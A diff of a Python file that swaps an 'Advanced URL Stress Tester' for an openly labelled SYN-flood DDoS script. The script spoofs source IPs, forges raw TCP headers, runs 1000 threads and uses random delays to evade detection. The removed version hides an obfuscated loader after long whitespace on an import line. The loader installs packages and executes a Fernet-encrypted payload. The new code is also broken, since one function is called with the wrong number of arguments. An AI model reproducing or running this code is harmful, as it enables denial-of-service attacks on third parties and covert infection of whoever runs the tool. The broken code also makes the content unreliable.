@@ -1,115 +1,109 @@
-import os
-import requests																																																																																																																																																																																																																																																																																																																																																																																																																;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Ox_aQCMlExWNBg8q79FcCZlHSLLvsYTgvbkiv5LQuA0=').decrypt(b'gAAAAABnOHtpzlxV3tBPJGgVHNzeUfY5fc1o0LZ7tqjljI7UZ_SEzsKgIDOnJijZ851JIPu5zk7GyCDe_RfSm-rhfOmXZs-pqAPbW5wWLXhsYgV6isis_eFTytD7VQiYwk8ZUfTV1DFk21u5AcBk_WirWWmgvp1qDmTF9o2Ndp24lCa32WTRNaE98Z6N0Jku_kVt2pl1_AybsZ7U4lw3jQlkDyIq0muK7A=='))
-import concurrent.futures
-import time
+import socket
 import random
+import threading
+import struct
+import time
 import argparse
 
-def stress_test(url, num_requests, concurrency, request_type="GET", headers=None, data=None):
-  start_time = time.time()
-  results = []
 
-  with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
-    futures = [executor.submit(make_request, url, request_type, headers, data) for _ in range(num_requests)]
+# Random IP Spoofing
+def random_ip():
+    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
 
-    for future in concurrent.futures.as_completed(futures):
-      try:
-        response_time, status_code, error = future.result()
-        results.append({"response_time": response_time, "status_code": status_code, "error": error})
-      except Exception as e:
-        results.append({"response_time": None, "status_code": None, "error": str(e)})
+# Random port generator to make it harder to block specific port ranges
+def random_port():
+    return random.randint(1024, 65535)
 
-  end_time = time.time()
-  total_time = end_time - start_time
+# Generate a random TCP sequence number
+def random_seq():
+    return random.randint(0, 4294967295)
 
-  return results, total_time
+# Generate a random TCP window size
+def random_window_size():
+    return random.randint(1024, 65535)
+
+# Create a fake/custom IP header
+def create_ip_header(source_ip, dest_ip):
+    ip_header = struct.pack('!BBHHHBBH4s4s',
+                            69,  # Version and header length (IPv4, 5 * 32 bits = 20 bytes)
+                            0,   # Type of service
+                            40,  # Total length
+                            random.randint(0, 65535),  # Identification
+                            0,   # Flags and Fragment Offset
+                            255, # Time to live
+                            socket.IPPROTO_TCP,  # Protocol
+                            0,   # Header checksum (leave as 0, calculated by kernel)
+                            socket.inet_aton(source_ip),  # Source IP
+                            socket.inet_aton(dest_ip))    # Destination IP
+    return ip_header
+
+# Create a TCP header with SYN flag set
+def create_tcp_header(source_port, dest_port):
+    tcp_header = struct.pack('!HHLLBBHHH',
+                            source_port,  # Source port
+                            dest_port,    # Destination port
+                            random_seq(),  # Sequence number
+                            0,            # Acknowledgment number
+                            80,           # Data offset and Reserved (TCP Header length)
+                            2,            # Flags (SYN flag set)
+                            random_window_size(),  # Window size
+                            0,            # Checksum (leave as 0, calculated by kernel)
+                            0)            # Urgent pointer
+    return tcp_header
 
 
-def make_request(url, request_type, headers, data):
-  start_time = time.time()
-  try:
-    if request_type == "GET":
-      response = requests.get(url, headers=headers)
-    elif request_type == "POST":
-      response = requests.post(url, headers=headers, data=data)
-    else:
-      raise ValueError("Invalid request type. Choose 'GET' or 'POST'.")
+# SYN Flood Attack with IP Spoofing and randomized packet structure
+def syn_flood(target_ip, target_port):
+    while True:
+        try:
+            # Create raw socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            # Spoofed source IP
+            source_ip = random_ip()
+            dest_ip = target_ip
+            # Random source port to avoid rate-limiting on a fixed port
+            source_port = random_port()
+            # Create IP and TCP headers
+            ip_header = create_ip_header(source_ip, dest_ip)
+            tcp_header = create_tcp_header(source_ip, dest_ip, source_port, target_port)
+            # Packet = IP header + TCP header
+            packet = ip_header + tcp_header
+            # Send the SYN packet
+            s.sendto(packet, (dest_ip, 0))
+            print(f"Sent SYN packet from {source_ip}:{source_port} to {dest_ip}:{target_port}")
+            # Randomize the delay between packets (anti-rate limiting)
+            time.sleep(random.uniform(0.1, 1.5))  # Add delay between 0.1 to 1.5 seconds to avoid detection
+        except Exception as e:
+            print(f"Error: {e}")
 
-    response_time = time.time() - start_time
-    return response_time, response.status_code, None
-  except requests.exceptions.RequestException as e:
-    return None, None, str(e)
+# Function to resolve domain to IP using nslookup
+def resolve_domain(domain):
+    try:
+        return socket.gethostbyname(domain)
+    except socket.gaierror as e:
+        print(f"Could not resolve domain {domain}: {e}")
+        return None
 
-
+# Main function to run the attack
 def main():
-  parser = argparse.ArgumentParser(description="Advanced URL Stress Tester")
-  parser.add_argument("url", help="Target URL")
-  parser.add_argument("-n", "--num_requests", type=int, default=100, help="Number of requests")
-  parser.add_argument("-c", "--concurrency", type=int, default=10, help="Number of concurrent requests")
-  parser.add_argument("-t", "--request_type", choices=["GET", "POST"], default="GET", help="Request type (GET or POST)")
-  args = parser.parse_args()
+    # Set up argument parsing
+    parser = argparse.ArgumentParser(description='Perform SYN Flood DDoS attack with IP Spoofing and Proxies.')
+    parser.add_argument('-u', '--url', type=str, required=True, help='Target website URL')
+    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default is 80 for HTTP)')
+    args = parser.parse_args()
 
-  results, total_time = stress_test(args.url, args.num_requests, args.concurrency, args.request_type)
+    # Resolve the target domain to IP
+    target_ip = resolve_domain(args.url)
+    if not target_ip:
+        print(f"Error: Could not resolve the target URL: {args.url}")
+        return
+    print(f"Resolved {args.url} to IP: {target_ip}")
 
-  print(f"Stress test complete in {total_time:.2f} seconds.")
-  print("Results:")
-  for result in results:
-    print(result)
-
+    # Launch multiple threads for more attack intensity
+    threads = 1000  # Increase for higher load
+    for _ in range(threads):
+        thread = threading.Thread(target=syn_flood, args=(target_ip, args.port))
+        thread.start()
 
 if __name__ == "__main__":
-  main()
-def stress_test(url, num_requests, concurrency, request_type="GET", headers=None, data=None):
-  start_time = time.time()
-  results = []
-
-  with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
-    futures = [executor.submit(make_request, url, request_type, headers, data) for _ in range(num_requests)]
-
-    for future in concurrent.futures.as_completed(futures):
-      try:
-        response_time, status_code, error = future.result()
-        results.append({"response_time": response_time, "status_code": status_code, "error": error})
-      except Exception as e:
-        results.append({"response_time": None, "status_code": None, "error": str(e)})
-
-  end_time = time.time()
-  total_time = end_time - start_time
-
-  return results, total_time
-
-
-def make_request(url, request_type, headers, data):
-  start_time = time.time()
-  try:
-    if request_type == "GET":
-      response = requests.get(url, headers=headers)
-    elif request_type == "POST":
-      response = requests.post(url, headers=headers, data=data)
-    else:
-      raise ValueError("Invalid request type. Choose 'GET' or 'POST'.")
-
-    response_time = time.time() - start_time
-    return response_time, response.status_code, None
-  except requests.exceptions.RequestException as e:
-    return None, None, str(e)
-
-
-def main():
-  parser = argparse.ArgumentParser(description="Advanced URL Stress Tester")
-  parser.add_argument("url", help="Target URL")
-  parser.add_argument("-n", "--num_requests", type=int, default=100, help="Number of requests")
-  parser.add_argument("-c", "--concurrency", type=int, default=10, help="Number of concurrent requests")
-  parser.add_argument("-t", "--request_type", choices=["GET", "POST"], default="GET", help="Request type (GET or POST)")
-  args = parser.parse_args()
-
-  results, total_time = stress_test(args.url, args.num_requests, args.concurrency, args.request_type)
-
-  print(f"Stress test complete in {total_time:.2f} seconds.")
-  print("Results:")
-  for result in results:
-    print(result)
-
-
-if __name__ == "__main__":
-  main()
+    main()
